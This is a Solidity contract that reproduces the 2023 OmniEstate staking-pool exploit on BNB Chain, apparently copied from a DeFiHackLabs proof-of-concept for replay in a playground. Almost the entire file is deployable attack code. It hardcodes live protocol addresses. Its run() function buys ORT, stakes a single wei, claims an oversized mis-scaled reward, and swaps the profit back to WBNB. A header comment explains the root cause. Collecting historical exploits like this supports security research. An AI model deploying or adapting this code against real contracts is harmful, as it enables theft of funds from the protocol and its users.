// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-01-OmniEstate).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); there is no standalone exploit contract). This
// contract is a faithful, self-contained copy of that inline attack
// (testExploit + bscSwap) so the playground can deploy it and record run().
// Logic and constants are copied verbatim from test/OmniEstate_exp.sol.
//
// Root cause: OmniStakingPool's withdrawAndClaim() returns the originally
// staked ORT PLUS a large fixed/mis-scaled reward mint regardless of how
// little was actually staked (`invest(0, 1)` stakes only 1 wei of ORT), so a
// staker can invest a dust amount and withdraw a reward far exceeding any
// real yield, netting a profit after round-tripping ORT back to WBNB.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWBNB {
    function deposit() external payable;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IOmniStakingPool {
    function invest(uint256 end_date, uint256 qty_ort) external;
    function withdrawAndClaim(uint256 lockId) external;
    function getUserStaking(address user) external returns (uint256[] memory);
}

contract OmniEstateExploit {
    address constant OMNI = 0x6f40A3d0c89cFfdC8A1af212A019C220A295E9bB;
    address constant ORT = 0x1d64327C74d6519afeF54E58730aD6fc797f05Ba;
    IUniRouterV2 constant ROUTER = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

    // Faithful copy of ContractTest.testExploit(): fund WBNB from native
    // balance, swap into ORT, invest a dust amount, withdraw+claim the
    // resulting mispriced reward, then swap the ORT back to WBNB.
    function run() external {
        // 1. get some ORT token
        WBNB.deposit{value: 1 ether}();
        bscSwap(address(WBNB), ORT, 1 ether);

        // 2. invest
        IERC20(ORT).approve(OMNI, type(uint256).max);
        IOmniStakingPool(OMNI).invest(0, 1);
        uint256[] memory stake_ = IOmniStakingPool(OMNI).getUserStaking(address(this));

        // 3. withdraw
        IOmniStakingPool(OMNI).withdrawAndClaim(stake_[0]);

        // 4. profit
        bscSwap(ORT, address(WBNB), IERC20(ORT).balanceOf(address(this)));
    }

    function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {
        IERC20(tokenFrom).approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = tokenFrom;
        path[1] = tokenTo;
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    receive() external payable {}
}
